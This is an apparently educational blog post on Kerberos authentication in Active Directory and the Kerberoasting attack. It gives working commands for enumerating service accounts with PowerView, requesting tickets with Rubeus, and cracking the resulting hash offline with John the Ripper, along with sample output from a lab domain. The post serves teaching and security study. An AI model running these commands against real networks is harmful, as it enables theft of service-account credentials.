---
cover: https://i.postimg.cc/NjfMXj1G/Designer-1.jpg
title: "A Deep Dive into Kerberos: Understanding Kerberoasting and ASREPRoasting Attacks."
date: 8/23/2024 6:50:40 +06:00
categories: research
tags: [Kerberos, Kerberoasting, Asreproasting]
toc: true
toc_number: false
---
# Overview

Welcome to my three-part blog series! In this first part, I'll dive deep into how Kerberos works and take a closer look at Kerberoasting and ASREPRoasting attacks. In the next part, we'll explore Kerberos delegation, some of the architectural and design issues in Kerberos, and how attackers can exploit these weaknesses. The final part will be about Shadow Credentials.

Kerberos is one of the main authentication protocols in Active Directory, along with NTLM and LDAP. It's considered secure because it uses tickets to authenticate clients and servers, avoiding the need to store passwords locally. Plus, it involves a trusted third party, the Key Distribution Center (KDC), which also acts as the domain controller and uses built-in symmetric cryptography. However, as with any security system, Kerberos isn't perfect and has its vulnerabilities. We will be using (Rubeus)[https://github.com/GhostPack/Rubeus] throughout this blog which is one of the most sought after tool when it comes to attacking Kerberos.

# Kerberos Working

![Kerberos Working](https://i.postimg.cc/YqdDpdRn/Untitled-Diagram-drawio.png)

There are generally three things involved in kerberos authentication
- Client
- Service 
- KDC (Authentication Server, Ticket granting Server)

Supose a user wants to access a service in a office which uses Active Directory network like HTTP service for accessing web applications, CIFS service for accessing file shares, LDAP Service, Database Services like MYSQL and Postgresql for database administration or searching stuffs, SMTP service for sending emails, IMAP or POP3 service and many more. How does he/she access them? Inside KDC which is the Domain Controller there are two servers one is the Authentication Server which confirms that a known user is making an access request and issues a valid TGT and another is Ticket Granting Server which confirms that the user is making access request to a known service aka which exists in the domain and issues a ST service Ticket.

- **AS-REQ(Authentication Server Request):** The user requests TGT from the authentication server by sending an encrypted timestamp which is encrypted using the user's password.
- **AS-REP(Authentication Server Response):** The authentication server verifies the client and sends back TGT, this TGT is encrypted using password hash of krbtgt account. 
- **TGS-REQ(Ticket Granting Server Request):** Suppose the client wants to access MSSQL-2 service on dev.dhitalcorp.local domain, now the client sends the TGT along with SPN(service principal name) `alex\MSSQL-2$@dev.dhitalcorp.local` to the ticket granting server to request for a service ticket.
- **TGS-REP(Ticket Granting Server Response):** The Ticket granting server verifies the TGT and provides them ST(Service Ticket) for the requested service. This service ticket is encrypted using the ntlm hash of the service. The TGS doesnot verify if the client has access to the service or not it directly provides them service ticket after verifying their TGT, since the service ticket is encrypted using NTLM hash of the service kerberoasting attack comes into play in here.
- **AP-REQ(Authentication Protocal Request):** The client sends the service ticket to the service 
- **AP-RES(Authentication Protocal Response):** The service verifies if the client has access and grants access.
# Kerberoasting

Most services run on a machine under the context of a user account. Above in the TGS-REP step, the Ticket Granting Server (TGS) sends the client a Service Ticket for the service they requested, based on the SPN they provided. Part of this Service Ticket is encrypted with the password of the user account running that service. The TGS doesn’t check if the client actually has access to that service or not. This means that as a regular domain user, we can request service tickets for any service and then crack them offline to uncover the plaintext password of the user account running that service. 

As a regular domain user first list all kerberoastable accounts(service accounts running in the context of user accounts). We can use [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

```bash
PS C:\Users\Alex> Get-DomainUser -SPN

distinguishedName : CN=SQLService,OU=Service Accounts,DC=dev,DC=dhitalcorp,DC=local
enabled           : True
name              : mssql_svc
objectClass       : user
objectGUID        : 12345678-90ab-cdef-1234-567890abcdef
passwordExpired   : False
pwdLastSet        : 7/23/2024 12:34:56 PM
samAccountName    : mssql_svc
servicePrincipalName : MSSQLSvc/sql-1.dev.dhitalcorp.local:1433
userPrincipalName : SQLService@dev.dhitalcorp.local
```
We can request service ticket for this `mssql_svc` service account and crack it offline.
- We can also use PowerView to request service ticket for this `mssql_svc` service account:  `Get-DomainUser -SPN mssql_svc | Get-DomainSPNTicket`
- We can also use [Invoke-Kerberoast](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/) to both find and roast kerberoastable accounts.
-  If you want the hash in specific format for cracking we can also request it using OutputFormat as `Get-DomaintUser -SPN mssql_svc | Get-DomainSPNTicket -OutputFormat hashcat`.

Below we are using Rubeus. 

```bash
PS C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

[*] Action: Kerberoasting

[*] Target User  : mssql_svc
[*] Target Realm : DEV.DHITALCORP.LOCAL

[*] Searching for service tickets...

[*] ServicePrincipalName              : MSSQLSvc/sql-1.dev.dhitalcorp.local:1433
[*] UserName                          : mssql_svc
[*] UserDomain                        : DEV.DHITALCORP.LOCAL
[*] ServiceTicket (base64)            : <ticket data>

[*] RC4_HMAC(NT) hash for mssql_svc@DEV.DHITALCORP.LOCAL:
$krb5tgs$23$*mssql_svc$DEV.DHITALCORP.LOCAL$MSSQLSvc/sql-1.dev.dhitalcorp.local:1433*$D098E44F9B1C3CDE120A4A3DA2D32C4F$5C233E56F3C8B12F7D0B8A5DCC5A8D0C99E3B5F471D618F3B830C6F7E6FDE63DDA3C91C8E5A5D78F3A8B49A4E59CBFA2EED4A6B91FC3E671B1C8B08A9AC292FB
```
Remove the service principal name from the hash to crack using John. The hash should be in format `$krb5tgs$23$*mssql_svc$DEV.DHITALCORP.LOCAL*$D098E44F9B1C3CDE120A4A3DA2D32C4F$5C233E56F3C8B12F7D0B8A5DCC5A8D0C99E3B5F471D618F3B830C6F7E6FDE63DDA3C91C8E5A5D78F3A8B49A4E59CBFA2EED4A6B91FC3E671B1C8B08A9AC292FB`. Save the hash as `mssql_svc.txt`. We can crack this using John as follows.

```bash
┌──(alex㉿kali)-[~]
└─$ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou2024.txt mssql_svc.txt
```
